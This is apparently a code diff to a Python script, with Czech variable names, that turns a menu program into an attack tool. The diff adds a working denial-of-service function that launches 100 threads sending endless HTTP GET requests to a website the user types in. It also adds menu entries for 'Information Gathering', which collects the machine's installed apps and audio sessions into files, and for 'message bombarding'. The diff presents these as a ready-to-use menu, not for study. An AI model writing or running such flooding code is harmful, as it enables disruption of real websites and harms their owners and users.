@@ -8,6 +8,9 @@ from comtypes import CLSCTX_ALL
 import psutil
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume, ISimpleAudioVolume
 import winreg
+import requests
+import threading
+import keyboard
 
 list_aplikace = []
 list_muzika = []
@@ -206,35 +209,64 @@ def get_installed_apps():
                     installed_apps.append(app_name)
                 except FileNotFoundError:
                     pass
-
     return installed_apps
 
-installed_apps = get_installed_apps()
-for app in installed_apps:
-    list_aplikace.append(app)
+packets_sent = 0
+stop_event = threading.Event()
 
-prave_hraje = get_audio_sessions()
-for pisnicky in prave_hraje:
-    list_muzika.append(pisnicky)
+def send_requests(url):
+    global packets_sent
+    while not stop_event.is_set():
+        try:
+            response = requests.get(url)
+            packets_sent += 1
+            print(f"Request sent! Status code: {response.status_code}")
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
 
-with open('data_aplikace.dat', 'w') as file:
-    aplikace = str(list_aplikace)
-    file.write(aplikace)
+def monitor_input():
+    global stop_event
+    keyboard.wait('q')
+    print("\n'q' detected, stopping attack...")
+    stop_event.set()
 
-with open('data_muzika.dat', 'w') as file:
-    muzika = str(list_muzika)
-    file.write(muzika)
+def ddos_attack(target_url):
+    global packets_sent
+    packets_sent = 0
+    stop_event.clear()
+    input_thread = threading.Thread(target=monitor_input)
+    input_thread.start()
+    threads = []
+    for i in range(100):
+        thread = threading.Thread(target=send_requests, args=(target_url,))
+        threads.append(thread)
+        thread.start()
+    for thread in threads:
+        thread.join()
+    print(f"Total packets sent: {packets_sent}")
 
-#with open('data_aplikace.dat', 'w') as file:
-#    file.write(list)
+def ziskej_informace():
+    installed_apps = get_installed_apps()
+    for app in installed_apps:
+        list_aplikace.append(app)
+    prave_hraje = get_audio_sessions()
+    for pisnicky in prave_hraje:
+        list_muzika.append(pisnicky)
 
+    with open('data_aplikace.dat', 'w') as file:
+        aplikace = str(list_aplikace)
+        file.write(aplikace)
+
+    with open('data_muzika.dat', 'w') as file:
+        muzika = str(list_muzika)
+        file.write(muzika)
 
 
 hlavni_cast()
 time.sleep(2)
-print("╠═ 1.) ")
-print("╠═ 2.) ")
-print("╠═ 3.) ")
+print("╠═ 1.) DDoS Attack")
+print("╠═ 2.) Information Gathering")
+print("╠═ 3.) All platforms message bombarding")
 print("╠═ 4.) ")
 print("╠═ 5.) ")
 print("╠═ 6.) ")
@@ -262,4 +294,11 @@ print("╠═ 27.) ")
 print("╠═ 28.) ")
 print("╠═ 29.) ")
 print("╠═ 30.) ")
-print("╚════>")
+print("╠═ Select a number: ")
+volba = int(input("╚════> "))
+
+if volba == 1:
+    print("╠═ What web do you prefer to start attack on it? ")
+    web = input("╚════> ")
+    web = "https://" + web
+    ddos_attack(web)
